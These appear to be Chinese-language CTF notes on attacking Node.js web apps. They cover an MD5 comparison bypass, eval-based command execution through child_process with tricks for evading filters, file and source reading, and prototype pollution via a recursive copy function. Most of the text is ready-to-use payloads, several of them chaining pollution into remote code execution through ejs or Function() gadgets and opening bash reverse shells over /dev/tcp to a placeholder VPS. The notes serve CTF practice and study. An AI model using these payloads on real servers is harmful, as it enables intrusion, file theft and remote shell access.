## **函数特性**
```
Character.toUpperCase()函数，字符ı会转变为I，字符ſ会变为S
Character.toLowerCase()函数，字符İ会转变为i，字符K会转变为k
```

绕过md5
```
 if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);

?a[x]=1&b[x]=2或者a[:]=1&b[:]=1
?a[x]=1&b[x]=2 相当于是说，a和b都是引用数据类型（对象类型），
a={'x':'1'}
b={'x':'2'}
那么在 a+flag和 b+flag 时，他们的结果就会都是［objectObject]flag{xxx}，那么md5值自然就是一样的了。
```


^
## **eval命令执行**

```
eval(require("child_process").execSync('ls'))


?eval=require("child_process").execSync('ls')

?eval=require('child_process').execSync('ls').toString()

?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require('child_process').spawnSync( 'ls', [ './' ] ).stdout.toString()

?eval=global.process.mainModule.constructor._load('child_process').execSync('ls')
```
```
//读文件夹，读文件函数
?eval=require('fs').readdirSync(".")
?eval=require('fs').readFileSync('./fl00g.txt','utf8');
```
```
//字符串拼接
?eval=var s='global.process.mainModule.constructor._lo';var b="ad('child_process').ex";var c="ec(%27ls>public/1.txt%27);";eval(s%2Bb%2Bc)%3B
```

^
有过滤exec|load。函数evalstring.search(/exec|load/i)
```
构造exec
?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require( 'child_process' ).spawnSync( 'ls', [ '.' ] ).stdout.toString()
?eval=require( 'child_process' ).spawnSync( 'cat', [ 'f*' ] ).stdout.toString()
```

查看目录和源码
```
?eval=__filename 可以看到路径为/app/routes/index.js 
?eval=__dirname  看到/app/routes/
?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')   查看源码
```



^
## **原型链污染**
类似于merge函数用于合并两个或多个对象的属性，将一个或多个源对象的属性复制到目标对象上。
可能造成原型链污染。
```
 var secert = {};
 let user = {};
 utils.copy(user,req.body);  //这里的copy类似merge函数。req.body是入口
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }
```
已知secert是对象类型，secert的原型类就是Object。
```
如果在secert继承到Object中的一个类的prototype有ctfshow属性值为36dboy，
那么secert.ctfshow值也存在为36dboy。

又每一个对象都有__proto__属性，通过secert.__proto__可以修改父类的Object.prototype，结合copy函数和json最终修改Object类prototype，定义了一个ctfshow值为36dboy

function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }

第一次循环，key 是 __proto__，因为每一个对象都有 __proto__ 属性，所以判断为TRUE，然后递归Q 调用copy函数。这次传参，object1 是object1['__proto__']，就是 object{....}，回溯到了Object类了
object2是object2['__proto__']， 就是{ ctfshow: "36dboy" }。此时 key为 ctfshow。因为Object没有ctfshow这个变量，所以经过判断为FALSE，进入else，执行 object1['ctfshow'」=object2［'ctfshow'］。
将Object类的ctfshow的值改为了 36dboy，那么所有继承object类的类都会有属性ctfshow=36dboy，
也就是所有类，因为所有类都是object的子类。
```
于是POST传递请求体
```
{"__proto__":{"ctfshow":"36dboy"}}
```






^
## **原型链污染组合**
**ejs模板漏洞导致rce**
```
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"');var __tmp2"}}
```


^
**污染函数Function创建的函数体，变成危险函数**
```
已知返回res.render('api', { query: Function(query)(query)});
```
污染query参数即可
```
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"')"}}

案例：
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
 var user ={}
 body=JSON.parse('{"__proto__":{"query":"return 123"}}');
 copy(user,body);
 console.log(Function(query)(query));
//输出 123
```

^
**继承的继承场景**
```
 var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
 utils.copy(user.userinfo,req.body);
 if(user.userinfo.isAdmin){
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }
```
req.body是入口，user.userinfo我们要通过这个污染Object,`userinfo` 的原型不是 `Object` 对象， `userinfo.__proto__.__proto__` 才是 `Object` 对象。
于是
```
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/IP/端口 0>&1\"')"}}
```


